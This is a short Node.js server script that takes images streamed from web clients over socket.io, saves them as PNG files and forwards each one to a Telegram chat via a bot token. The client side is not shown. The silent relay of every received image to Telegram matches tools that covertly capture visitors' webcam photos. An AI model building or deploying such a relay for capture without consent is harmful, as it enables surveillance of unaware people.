require('dotenv').config();
const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);
const canvas = require('canvas');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const API_TOKEN = process.env.API_KEY;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/pages/index.html');
});

io.on('connection', (socket) => {
    console.log('Client connected');
    socket.on('image', (data) => {
        const img = new canvas.Image();
        img.onload = () => {
            const canva = new canvas.Canvas(img.width, img.height);
            const ctx = canva.getContext('2d');
            ctx.drawImage(img, 0, 0, img.width, img.height);
            const buffer = canva.toBuffer('image/png');
            const fileName = `photo-${Date.now()}.png`;
            fs.writeFile(`photos/${fileName}`, buffer, (err) => {
                if (err) {
                    console.error(err);
                    console.log('Error saving photo');
                } else {
                    console.log('Photo saved');
                    const image = fs.createReadStream(`photos/${fileName}`);
                    // create a new FormData object
                    const formData = new FormData();
                    // append the image stream to the FormData object
                    formData.append('photo', image);
                    // append the chat id to the FormData object
                    formData.append('chat_id', CHAT_ID);
                    // append the text message
                    formData.append('text', fileName);
                    // send the FormData object
                    axios.post(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, formData, {
                        headers: {
                            ...formData.getHeaders(),
                        },
                    })
                        .then((response) => {
                            console.log('Image sent successfully:', response.data);
                        })
                        .catch((error) => {
                            console.error('Error sending image:', error);
                        });
                }
            });
        };
        img.onerror = () => {
            console.log('Invalid image data');
        };
        img.src = data;
    });
});

server.listen(3000, () => {
    console.log('Server listening on port 3000');
});
